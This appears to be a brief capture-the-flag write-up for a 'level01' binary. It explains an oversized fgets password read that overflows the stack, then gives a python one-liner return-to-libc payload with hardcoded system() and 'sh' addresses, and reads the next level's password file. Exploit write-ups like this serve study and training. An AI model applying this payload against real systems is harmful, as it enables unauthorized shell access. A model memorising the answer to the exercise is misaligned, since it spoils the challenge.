The program use fgets to read a username and compare it with "dat_wil"

then it use fgets again to read a password but this time the read input length is greater than the buffer
therefore there is a possible stack overflow 

we can use it to perform a return-to-libc

so we prepare the payload with the username then dummy bytes to overflow the buffer 
then the libc's system's address, a dummy return address, and finally the string "sh" from environment variable


level01 $> (python -c 'print "dat_wil\n"+ "A"*80 +"\xd0\xae\xe6\xf7" + "0000" + "\xde\xd8\xff\xff"'; cat) | ./level01

level02 $> cat ~level02/.pass
